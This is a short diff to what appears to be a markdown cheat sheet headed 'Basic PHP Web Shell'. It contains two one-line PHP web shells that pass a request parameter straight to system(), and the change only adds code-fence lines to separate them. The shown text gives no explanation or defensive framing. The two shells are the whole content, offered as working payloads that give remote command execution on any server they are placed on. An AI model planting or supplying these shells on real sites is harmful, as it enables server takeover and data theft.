@@ -17,5 +17,7 @@
 # Basic PHP Web Shell
 ```
 <?php system($_REQUEST['cmd']); ?>
+```
+```
 <?PHP system($_GET['cmd']);?>
 ```
